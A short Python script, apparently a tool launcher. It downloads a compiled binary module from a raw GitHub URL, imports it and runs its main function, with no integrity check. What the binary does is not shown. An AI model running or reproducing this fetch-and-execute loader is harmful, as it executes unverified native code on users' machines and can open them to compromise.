import urllib.request
import os
url = "https://raw.githubusercontent.com/SKBER-CYBER/oggy-core/main/oggy_back.so"
file_name = "oggy_back.so"
if not os.path.exists(file_name):
    print("📥 Downloading core file...")
    urllib.request.urlretrieve(url, file_name)
    print("✅ Download done")
import oggy_back
print("🔥 Loaded successfully")
if hasattr(oggy_back, "main"):
    oggy_back.main()
module
